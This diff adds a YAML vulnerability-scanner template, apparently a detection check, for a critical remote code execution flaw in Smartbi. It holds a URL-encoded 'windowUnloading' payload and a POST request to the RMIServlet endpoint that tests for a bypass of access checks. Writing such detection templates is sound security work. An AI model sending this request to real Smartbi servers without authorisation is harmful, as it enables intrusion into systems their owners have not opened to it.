@@ -1,0 +1,26 @@
+id: poc-yaml-smartbi-windowunloading-rce
+info:
+  name: Smartbi WindowUnloading 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - 两高一弱
+  finger: Smartbi
+variables:
+  r_path: '/smartbi/
+
+    /'
+  r_payload: '&%7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54
+
+    %7a%44%70%34%57%70%34%67%52%69%70%2b%69%49%70%69%47%5a%70%34%44%52%77%36%2b%2f%4a%56%2f%75%75%75%37%75%4e%66%37%4e%66%4e%31%2f%75%37%31%27%2f%4e%4f%4a%4d%2f%4e%4f%4a%4e%2f%75%75%2f%4a%54'
+requests:
+- method: POST
+  path: '{{.r_path}}vision/RMIServlet?windowUnloading={{.r_payload}}'
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: className=UserService&methodName=isLogged&params=[]
+  expression: 'status_code == 200 && contains(body, "H~CxOm~") && !contains(body,
+    "没有权限")
+
+    '
+transport: http
